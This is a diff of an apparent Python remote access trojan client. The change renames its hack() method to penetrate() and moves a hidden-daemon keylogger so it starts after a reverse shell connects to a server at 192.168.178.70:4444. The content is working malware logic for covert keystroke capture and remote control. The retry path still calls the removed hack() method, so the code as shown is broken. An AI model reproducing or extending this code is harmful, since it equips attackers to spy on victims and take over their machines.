@@ -41,20 +41,12 @@ class Client:
         
         
 
-    def hack(self) -> None:
+    def penetrate(self) -> None:
         """
         Creates a connection between server and client.
         Starts logging key events
         Gets a reverse shell from client to server
         """
-        
-        # --------------------------KEYLOGGER--------------------------#
-        
-        # Start handler and make the proccess hidden
-        with daemon.DaemonContext(files_preserve=[logging.getLogger().handlers[0].stream]):
-            # Start keylogger
-            self.keylogger.setup()
-            self.keylogger.start_logging()
         
         # --------------------------REV SHELL--------------------------#
          
@@ -65,12 +57,22 @@ class Client:
             time.sleep(5)  # Wait 5s
             self.sock.close()  # Close erroneous connection
             self.hack()  # Retry
+            
+        
+        # --------------------------KEYLOGGER--------------------------#
+        
+        # Start handler and make the proccess hidden
+        with daemon.DaemonContext(files_preserve=[logging.getLogger().handlers[0].stream]):
+            # Start keylogger
+            self.keylogger.setup()
+            self.keylogger.start_logging()
 
+        #--------------------------------------------------------------#
+        
         # Close connection when finished
         self.sock.close()
 
 
 if __name__ == "__main__":
     # Run RAT with specified IP and port
-    Client("192.168.178.70", 4444).hack()
-    
+    Client("192.168.178.70", 4444).penetrate()
